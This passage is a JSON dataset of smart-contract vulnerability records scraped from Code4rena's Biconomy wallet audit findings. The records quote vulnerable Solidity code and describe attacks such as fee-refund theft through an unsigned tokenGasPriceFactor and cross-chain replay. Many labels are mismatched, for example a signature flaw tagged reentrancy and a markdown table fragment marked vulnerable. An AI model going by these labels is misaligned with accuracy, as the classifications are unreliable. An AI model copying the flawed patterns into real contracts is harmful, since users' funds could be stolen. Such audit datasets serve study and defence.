    "description": "*Submitted by [Ruhum](https://github.com/code-423n4/2023-01-biconomy-findings/issues/123), also found by [V\\_B](https://github.com/code-423n4/2023-01-biconomy-findings/issues/492), [adriro](https://github.com/code-423n4/2023-01-biconomy-findings/issues/447), [immeas](https://github.com/code-423n4/2023-01-biconomy-findings/issues/414), [supernova](https://github.com/code-423n4/2023-01-biconomy-findings/issues/300), [MalfurionWhitehat](https://github.com/code-423n4/2023-01-biconomy-findings/issues/211), [cccz](https://github.com/code-423n4/2023-01-biconomy-findings/issues/193), and [ladboy233](https://github.com/code-423n4/2023-01-biconomy-findings/issues/165)* [contracts/smart-contract-wallet/SmartAccount.sol#L288](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L288)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L429-L444](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L429-L444) The submitter of a transaction is paid back the transaction's gas costs either in ETH or in ERC20 tokens. With ERC20 tokens the following formula is used: $(gasUsed + baseGas) \\* gasPrice / tokenGasPriceFactor$. `baseGas`, `gasPrice`, and `tokenGasPriceFactor` are values specified by the tx submitter. Since you don't want the submitter to choose arbitrary values and pay themselves as much as they want, those values are supposed to be signed off by the owner of the wallet. The signature of the user is included in the tx so that the contract can verify that all the values are correct. But, the `tokenGasPriceFactor` value is not included in those checks. Thus, the submitter is able to simulate the tx with value $x$, get the user to sign that tx, and then submit it with $y$ for `tokenGasPriceFactor`. That way they can increase the actual gas repayment and steal the user's funds.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.029,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "sol\n    function handlePayment(\n        uint256 gasUsed,\n        uint256 baseGas,\n        uint256 gasPrice,\n        uint256 tokenGasPriceFactor,\n        address gasToken,\n        address payable refundReceiver\n    ) private nonReentrant returns (uint256 payment) {\n        // uint256 startGas = gasleft();\n        // solhint-disable-next-line avoid-tx-origin\n        address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n        if (gasToken == address(0)) {\n            // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n            payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n            (bool success,) = receiver.call{value: payment}(\"\");\n            require(success, \"BSA011\");\n        } else {\n            payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n            require(transferToken(gasToken, receiver, payment), \"BSA012\");\n        }\n        // uint256 requiredGas = startGas - gasleft();\n        //console.log(\"hp %s\", requiredGas);\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "In `encodeTransactionData()` we can see that `tokenGasPriceFactor` is not included: function encodeTransactionData( Transaction memory _tx, FeeRefund memory refundInfo, uint256 _nonce",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "encodeTransactionData",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add `batchId` to the hash calculation of the transaction in `encodeTransactionData` function. **[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/36#issuecomment-1404370864)** ***",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {\n\tif (initCode.length != 0) {\n\t\taddress sender = opInfo.mUserOp.sender;\n    \tif (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\n      \taddress sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);\n        if (sender1 == address(0)) revert FailedOp(opIndex, address(0), \"AA13 initCode failed or OOG\");\n        if (sender1 != sender) revert FailedOp(opIndex, address(0), \"AA14 initCode must return sender\");\n        if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\n        address factory = address(bytes20(initCode[0:20]));\n      \temit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);\n\t}\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "**Sender existence** Create the account if it does not yet exist, using the initcode provided in the UserOperation. If the account does not exist, and the initcode is empty, or does not deploy a contract at the \u201csender\u201d address, the call must fail. If we take a look at the [`_createSenderIfNeeded()`]() function, we can see that it's not properly implemented: function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal { if (initCode.length != 0) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.879,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "to prevent replay attacks ... the signature should depend on chainid",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Proof of Concept",
    "description": "As specified by the [EIP4337](https://eips.ethereum.org/EIPS/eip-4337) standard `to prevent replay attacks ... the signature should depend on chainid`. In [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90) the chainId is missing which means that the same UserOperation can be replayed on a different chain for the same smart contract account if the `verifyingSigner` is the same (and most likely this will be the case).",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.068,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "javascript\nFile: SmartAccount.sol\n\n460:    function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n461:        _requireFromEntryPointOrOwner();\n462:        _call(dest, value, func);\n463:    }\n464:\n465:    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n466:        _requireFromEntryPointOrOwner();\n467:        require(dest.length == func.length, \"wrong array lengths\");\n468:        for (uint i = 0; i < dest.length;) {\n469:            _call(dest[i], 0, func[i]);\n470:            unchecked {\n471:                ++i;\n472:            }\n473:        }\n474:    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "[[M-04] Methods used by EntryPoint has `onlyOwner` modifier](https://github.com/code-423n4/2023-01-biconomy-findings/issues/390)",
    "description": "*Submitted by [immeas](https://github.com/code-423n4/2023-01-biconomy-findings/issues/390), also found by [Kutu](https://github.com/code-423n4/2023-01-biconomy-findings/issues/495), [0xDave](https://github.com/code-423n4/2023-01-biconomy-findings/issues/411), [betweenETHlines](https://github.com/code-423n4/2023-01-biconomy-findings/issues/395), [hansfriese](https://github.com/code-423n4/2023-01-biconomy-findings/issues/389), [wait](https://github.com/code-423n4/2023-01-biconomy-findings/issues/377), [peanuts](https://github.com/code-423n4/2023-01-biconomy-findings/issues/350), [hihen](https://github.com/code-423n4/2023-01-biconomy-findings/issues/332), [prc](https://github.com/code-423n4/2023-01-biconomy-findings/issues/312), [0xbepresent](https://github.com/code-423n4/2023-01-biconomy-findings/issues/106), and [HE1M](https://github.com/code-423n4/2023-01-biconomy-findings/issues/89)* [contracts/smart-contract-wallet/SmartAccount.sol#L460-L461](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460-L461)<br> [contracts/smart-contract-wallet/SmartAccount.sol#L465-L466](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465-L466) `execute` and `executeBatch` in `SmartAccount.sol` can only be called by owner, not EntryPoint: File: SmartAccount.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 19,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.628,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "javascript\n56:    /**\n57:     * execute a transaction (called directly from owner, not by entryPoint)\n58:     */\n59:    function execute(address dest, uint256 value, bytes calldata func) external {\n60:        _requireFromEntryPointOrOwner();\n61:        _call(dest, value, func);\n62:    }\n63:\n64:    /**\n65:     * execute a sequence of transaction\n66:     */\n67:    function executeBatch(address[] calldata dest, bytes[] calldata func) external {\n68:        _requireFromEntryPointOrOwner();\n69:        require(dest.length == func.length, \"wrong array lengths\");\n70:        for (uint256 i = 0; i < dest.length; i++) {\n71:            _call(dest[i], 0, func[i]);\n72:        }\n73:    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "High",
    "title": "Proof of Concept",
    "description": "The reference implementation has both these functions without any onlyOwner modifiers: <https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/samples/SimpleAccount.sol#L56-L73> 56:    /** 57:     * execute a transaction (called directly from owner, not by entryPoint) 58:     */",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.681,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "isValidSignature(bytes32,bytes)",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "[[M-06] Doesn't Follow ERC1271 Standard](https://github.com/code-423n4/2023-01-biconomy-findings/issues/288)",
    "description": "*Submitted by [Atarpara](https://github.com/code-423n4/2023-01-biconomy-findings/issues/288), also found by [gz627](https://github.com/code-423n4/2023-01-biconomy-findings/issues/370) and [zapaz](https://github.com/code-423n4/2023-01-biconomy-findings/issues/132)* As Per [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard `ERC1271_MAGIC_VAULE` should be `0x1626ba7e` instead of `0x20c13b0b` and function name should be `isValidSignature(bytes32,bytes)` instead of  `isValidSignature(bytes,bytes)`. Due to this, signature verifier contract go fallback function and return unexpected value and never return `ERC1271_MAGIC_VALUE` and always revert `execTransaction` function.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.031,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "// singleton slot always needs to be first declared variable, to ensure that it is at the same location as in the Proxy contract.",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add storage gaps to all inherited contracts that contain storage variables. **[livingrockrises (Biconomy) commented](https://github.com/code-423n4/2023-01-biconomy-findings/issues/261#issuecomment-1397357822):** > Regarding storage gaps I want to bring this up. > > SmartAccount first storage is Singleton(first inherited contract)<br>",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.129,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(batchId != 0, \"batchId 0 is used only by EntryPoint\")",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Recommended Mitigation Steps",
    "description": "Add a requirement that `batchId` is not `0` in `execTransaction`: `require(batchId != 0, \"batchId 0 is used only by EntryPoint\")` **[livingrockrises (Biconomy) confirmed](https://github.com/code-423n4/2023-01-biconomy-findings/issues/246#issuecomment-1397693932)** ***",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.061,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "| 1 |\n| [N-17] |Use underscores for number literals| 2 |\n| [N-18] |",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Non-Critical Issues List",
    "description": "| Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01]|Insufficient coverage|1| | [N-02] |Unused function parameter and local variable |2| | [N-03] |Initial value check is missing in Set Functions| 3 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  246  \n  247:     function handlePayment(\n  248:         uint256 gasUsed,\n  249:         uint256 baseGas,\n  250:         uint256 gasPrice,\n  251:         uint256 tokenGasPriceFactor,\n  252:         address gasToken,\n  253:         address payable refundReceiver\n  254:     ) private nonReentrant returns (uint256 payment) {\n  255:         // uint256 startGas = gasleft();\n  256:         // solhint-disable-next-line avoid-tx-origin\n  257:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  258:         if (gasToken == address(0)) {\n  259:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  260:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  261:             (bool success,) = receiver.call{value: payment}(\"\");\n  262:             require(success, \"BSA011\");\n  263:         } else {\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  265:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  266:         }\n  267:         // uint256 requiredGas = startGas - gasleft();\n  268:         //console.log(\"hp %s\", requiredGas);\n  269:     }\n  270: \n  271:     function handlePaymentRevert(\n  272:         uint256 gasUsed,\n  273:         uint256 baseGas,\n  274:         uint256 gasPrice,\n  275:         uint256 tokenGasPriceFactor,\n  276:         address gasToken,\n  277:         address payable refundReceiver\n  278:     ) external returns (uint256 payment) {\n  279:         uint256 startGas = gasleft();\n  280:         // solhint-disable-next-line avoid-tx-origin\n  281:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  282:         if (gasToken == address(0)) {\n  283:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  284:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  285:             (bool success,) = receiver.call{value: payment}(\"\");\n  286:             require(success, \"BSA011\");\n  287:         } else {\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  289:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  290:         }\n  291:         uint256 requiredGas = startGas - gasleft();\n  292:         //console.log(\"hpr %s\", requiredGas);\n  293:         // Convert response to string and return via error message\n  294:         revert(string(abi.encodePacked(requiredGas)));\n  295:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-01] Prevent division by 0",
    "description": "On several locations in the code precautions are not being taken for not dividing by 0, this will revert the code.<br> These functions can be called with 0 value in the input, this value is not checked for being bigger than 0, that means in some scenarios this can potentially trigger a division by zero. [SmartAccount.sol#L247-L295](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L247-L295) 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  28       * @param _owner EOA signatory of the wallet\n  29:      * @param _entryPoint AA 4337 entry point address\n  30       * @param _handler fallback handler address\n\n  49       * @param _owner EOA signatory of the wallet\n  50:      * @param _entryPoint AA 4337 entry point address\n  51       * @param _handler fallback handler address\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  1  /**\n  2:  ** Account-Abstraction (EIP-4337) singleton EntryPoint implementation.\n  3   ** Only one instance required on each chain.\n\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol:\n  21   * paymasterAndData holds the paymaster address followed by the token address to use.\n  22:  * @notice This paymaster will be rejected by the standard rules of EIP4337, as it uses an external oracle.\n  23   * (the standard rules ban accessing data of an external contract)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "High",
    "title": "[L-02] Use of EIP 4337, which is likely to change, not recommended for general use or application",
    "description": "contracts/smart-contract-wallet/SmartAccountFactory.sol: 28       * @param _owner EOA signatory of the wallet 29:      * @param _entryPoint AA 4337 entry point address 30       * @param _handler fallback handler address 49       * @param _owner EOA signatory of the wallet",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  114       */\n  115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external {\n  116:         DepositInfo storage info = deposits[msg.sender];\n  117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");\n  118:         info.deposit = uint112(info.deposit - withdrawAmount);\n  119:         emit Withdrawn(msg.sender, withdrawAddress, withdrawAmount);\n  120:         (bool success,) = withdrawAddress.call{value : withdrawAmount}(\"\");\n  121:         require(success, \"failed to withdraw\");\n  122:     }\n  123  }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "[L-03] Consider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256",
    "description": "contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol: 114       */ 115:     function withdrawTo(address payable withdrawAddress, uint256 withdrawAmount) external { 116:         DepositInfo storage info = deposits[msg.sender]; 117:         require(withdrawAmount <= info.deposit, \"Withdraw amount too large\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.643,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "diff\ncontracts\\smart-contract-wallet\\SmartAccount.sol#l451\n  449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n- 451:       (bool success,) = dest.call{value:amount}(\"\");                              \n+            assembly {                                    \n+                success := call(gas(), dest, amount, 0, 0)\n+            }                                             \n+                                                          \n  452            require(success,\"transfer failed\");\n  453       }\n  454\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-04] Gas griefing/theft is possible on unsafe external call",
    "description": "`return` data `(bool success,)` has to be stored due to EVM architecture, if in a usage like below, 'out' and 'outsize' values are given (0,0) . Thus, this storage disappears and may come from external contracts a possible Gas griefing/theft problem is avoided https://twitter.com/pashovkrum/status/1607024043718316032?t=xs30iD6ORWtE2bTTYsCFIQ&s=19 There are 8 instances of the topic. contracts\\smart-contract-wallet\\SmartAccount.sol#l451 449     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.559,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  64      */\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n  66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");\n  67:         verifyingSigner = _newVerifyingSigner;\n  68:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-05] Front running attacks by the `onlyOwner`",
    "description": "`verifyingSigner` value is not a constant value and can be changed with `setSigner` function, before a function using `verifyingSigner` state variable value in the project, `setSigner` function can be triggered by `onlyOwner` and operations can be blocked contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol: 64      */ 65:     function setSigner( address _newVerifyingSigner) external onlyOwner{ 66:         require(_newVerifyingSigner != address(0), \"VerifyingPaymaster: new signer can not be zero address\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.373,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n\n14 results - 3 files\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n   72:     // onlyOwner\n   76:     modifier onlyOwner {\n   81:     // onlyOwner OR self\n  449:     function transfer(address payable dest, uint amount) external nonReentrant onlyOwner {\n  455:     function pullTokens(address token, address dest, uint256 amount) external onlyOwner {\n  460:     function execute(address dest, uint value, bytes calldata func) external onlyOwner{\n  465:     function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{\n  536:     function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  24:     function setEntryPoint(IEntryPoint _entryPoint) public onlyOwner {\n  67:     function withdrawTo(address payable withdrawAddress, uint256 amount) public virtual onlyOwner {\n  75:     function addStake(uint32 unstakeDelaySec) external payable onlyOwner {\n  90:     function unlockStake() external onlyOwner {\n  99:     function withdrawStake(address payable withdrawAddress) external onlyOwner {\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  65:     function setSigner( address _newVerifyingSigner) external onlyOwner{\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "High",
    "title": "Impact",
    "description": "The `onlyOwner` role has a single point of failure and `onlyOwner` can use critical a few functions. Even if protocol admins/developers are not malicious there is still a chance for Owner keys to be stolen. In such a case, the attacker can cause serious damage to the project due to important functions. In such a case, users who have invested in project will suffer high financial losses. ` onlyOwner ` functions; 14 results - 3 files contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 25,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n\n2 results - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "[L-07] Loss of precision due to rounding",
    "description": "Add scalars so roundings are negligible. 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor); 288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.254,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "js\nStorage Gaps\nThis makes the storage layouts incompatible, as explained in Writing Upgradeable Contracts. \nThe size of the __gap array is calculated so that the amount of storage used by a contract \nalways adds up to the same number (in this case 50 storage slots).\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Impact",
    "description": "For upgradeable contracts, inheriting contracts may introduce new variables. In order to be able to add new variables to the upgradeable contract without causing storage collisions, a storage gap should be added to the upgradeable contract. If no storage gap is added, when the upgradable contract introduces new variables, it may override the variables in the inheriting contract. Storage gaps are a convention for reserving storage slots in a base contract, allowing future versions of that contract to use up those slots without affecting the storage layout of child contracts.<br> To create a storage gap, declare a fixed-size array in the base contract with an initial number of slots.<br> This can be an array of uint256 so that each element reserves a 32 byte slot. Use the naming convention `__gap` so that OpenZeppelin Upgrades will recognize the gap:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.268,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n1 result - 1 file\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  109:     function setOwner(address _newOwner) external mixedAuth {\n  110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\");\n  111:         address oldOwner = owner;\n  112:         owner = _newOwner;\n  113:         emit EOAChanged(address(this), oldOwner, _newOwner);\n  114:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "[L-10] Use `2StepSetOwner ` instead of ` setOwner `",
    "description": "1 result - 1 file contracts/smart-contract-wallet/SmartAccount.sol: 109:     function setOwner(address _newOwner) external mixedAuth { 110:         require(_newOwner != address(0), \"Smart Account:: new Signatory address cannot be zero\"); 111:         address oldOwner = owner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.409,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
